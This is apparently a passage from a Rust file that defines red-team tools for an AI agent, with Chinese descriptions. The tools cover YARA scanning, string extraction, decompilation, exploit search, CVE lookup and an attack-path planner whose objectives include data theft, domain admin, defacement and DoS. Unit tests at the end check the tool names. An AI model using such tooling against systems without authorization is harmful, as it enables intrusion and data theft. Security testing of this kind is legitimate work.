                },
                "custom_rules": {
                    "type": "string",
                    "description": "自定义 YARA 规则内容（custom 模式时提供）"
                },
                "scan_type": {
                    "type": "string",
                    "description": "扫描类型：file（单文件）、directory（目录递归）、process（运行进程）",
                    "enum": ["file", "directory", "process"]
                }
            },
            "required": ["target_path"]
        }),
    }
}

/// 字符串提取分析
fn strings_extractor() -> AgentToolConfig {
    AgentToolConfig {
        name: "strings_extractor".into(),
        description: r#"从二进制文件中提取可打印字符串。提取：IP地址、域名、URL、硬编码凭证、API keys、错误消息、调试信息、C2配置、可疑函数调用、文件路径。示例：strings -n 8 malware.exe | grep -E '(http|ftp|192.168|10.)'"#.into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "file_path": {
                    "type": "string",
                    "description": "要分析的文件路径"
                },
                "min_length": {
                    "type": "integer",
                    "description": "最小字符串长度，默认 8"
                },
                "filter_patterns": {
                    "type": "array",
                    "items": {"type": "string"},
                    "description": "过滤模式（grep），如 'http'、'192.168'、'password'、'api'"
                },
                "encoding": {
                    "type": "string",
                    "description": "编码格式：ascii（默认）、utf8、utf16、both",
                    "enum": ["ascii", "utf8", "utf16", "both"]
                }
            },
            "required": ["file_path"]
        }),
    }
}

/// 反编译字节码
fn decompile_bytecode() -> AgentToolConfig {
    AgentToolConfig {
        name: "decompile_bytecode".into(),
        description: "反编译多种语言的字节码/中间代码。可处理：Python bytecode (.pyc)、Java class/jar (.class)、.NET IL (.dll/.exe)、APK (Dex)、PowerShell (.ps1)、PHP (opcode)。输出伪代码或近似源代码。示例：使用 pycdc、cfr、dnSpy、jadx、uncompyle6。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "file_path": {
                    "type": "string",
                    "description": "要反编译的文件"
                },
                "file_type": {
                    "type": "string",
                    "description": "文件类型：python（Python字节码）、java（Java Class/JAR）、dotnet（.NET程序集）、android（APK/Dex）、powershell（PowerShell脚本）、php（PHP opcode）",
                    "enum": ["python", "java", "dotnet", "android", "powershell", "php"]
                },
                "output_format": {
                    "type": "string",
                    "description": "输出格式：pseudo（伪代码）、source（尝试还原源码）、both（两者都）",
                    "enum": ["pseudo", "source", "both"]
                }
            },
            "required": ["file_path", "file_type"]
        }),
    }
}

// ============================================================================
// 综合工具
// ============================================================================

/// 漏洞利用搜索
fn exploit_search() -> AgentToolConfig {
    AgentToolConfig {
        name: "exploit_search".into(),
        description: "综合搜索漏洞利用代码。搜索：Exploit-DB、Metasploit、PacketStorm、CVE、ICS-CERT、NVD。输入软件名、版本、CVE ID，返回：EDB-ID、MSF module path、CVE评分（CVSS）、漏洞类型、发布日期、利用代码可用性。示例：searchsploit 'Microsoft Exchange' --title | grep 'CVE-2023'".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "keyword": {
                    "type": "string",
                    "description": "搜索关键词：CVE ID（如 CVE-2021-44228）、软件名+版本、漏洞类型"
                },
                "search_source": {
                    "type": "string",
                    "description": "搜索来源：all（全部）、edb（Exploit-DB）、msf（Metasploit）、cve（NVD/CVE）、packetstorm",
                    "enum": ["all", "edb", "msf", "cve", "packetstorm"]
                },
                "cvss_min": {
                    "type": "number",
                    "description": "最低 CVSS 评分，筛选高危漏洞，如 7.0"
                }
            },
            "required": ["keyword"]
        }),
    }
}

/// CVE 查询
fn cve_lookup() -> AgentToolConfig {
    AgentToolConfig {
        name: "cve_lookup".into(),
        description: "查询 CVE 漏洞详细信息。来源：NVD、MITRE CVE、CNVD、CNNVD。返回：漏洞描述、CVSS v2/v3 评分、影响范围（产品/版本）、参考链接、解决方案/补丁、相关漏洞、ATT&CK 映射。示例：curl 'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228'".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "cve_id": {
                    "type": "string",
                    "description": "CVE ID，如 CVE-2021-44228（Log4Shell）、CVE-2019-0708（BlueKeep）"
                },
                "product": {
                    "type": "string",
                    "description": "产品名称过滤，如 'apache'、'nginx'、'openssh'"
                },
                "year": {
                    "type": "integer",
                    "description": "年份过滤，如 2023"
                },
                "severity": {
                    "type": "string",
                    "description": "严重等级：critical（严重）、high（高危）、medium（中危）、low（低危）",
                    "enum": ["critical", "high", "medium", "low"]
                }
            },
            "required": ["cve_id"]
        }),
    }
}

/// 攻击路径规划
fn attack_path_planner() -> AgentToolConfig {
    AgentToolConfig {
        name: "attack_path_planner".into(),
        description: "基于收集的侦察信息，规划攻击路径。分析：网络拓扑、暴露服务、已知漏洞、认证机制、网络分区，生成攻击链图谱（Kill Chain）和 MITRE ATT&CK 矩阵映射。输出：攻击阶段划分、每阶段可用技术、推荐工具、预期成功率和风险评估。示例：使用 BloodHound 分析 AD 域环境。".into(),
        parameters: serde_json::json!({
            "type": "object",
            "properties": {
                "env_type": {
                    "type": "string",
                    "description": "目标环境类型：webapp（Web应用）、internal（内网企业）、cloud（云环境）、ad（Active Directory）、ics（工控系统）",
                    "enum": ["webapp", "internal", "cloud", "ad", "ics"]
                },
                "scanned_data": {
                    "type": "string",
                    "description": "侦察阶段收集的数据摘要（Nmap 结果、发现的漏洞列表、目标架构描述）"
                },
                "objective": {
                    "type": "string",
                    "description": "攻击目标：data（窃取数据）、rce（远程代码执行）、domain_admin（域管理员）、deface（篡改）、doS（拒绝服务）",
                    "enum": ["data", "rce", "domain_admin", "deface", "doS"]
                }
            },
            "required": ["env_type", "scanned_data"]
        }),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn redteam_tools_not_empty() {
        let tools = redteam_tool_definitions();
        assert!(!tools.is_empty());
    }

    #[test]
    fn each_tool_has_required_fields() {
        let tools = redteam_tool_definitions();
        for tool in &tools {
            assert!(!tool.name.is_empty());
            assert!(!tool.description.is_empty());
        }
    }

    #[test]
    fn tool_names_are_unique() {
        let tools = redteam_tool_definitions();
        let mut names: Vec<&String> = tools.iter().map(|t| &t.name).collect();
        names.sort();
        names.dedup();
        assert_eq!(names.len(), tools.len());
    }

    #[test]
    fn critical_tools_exist() {
        let tools = redteam_tool_definitions();
        let names: Vec<&str> = tools.iter().map(|t| t.name.as_str()).collect();
        assert!(names.contains(&"run_nmap"), "缺少 run_nmap");
        assert!(names.contains(&"sqlmap_scan"), "缺少 sqlmap_scan");
        assert!(
            names.contains(&"payload_generator"),
            "缺少 payload_generator"
        );
        assert!(
            names.contains(&"privilege_escalation_check"),
            "缺少 privilege_escalation_check"
        );
        assert!(names.contains(&"cve_lookup"), "缺少 cve_lookup");
    }
}
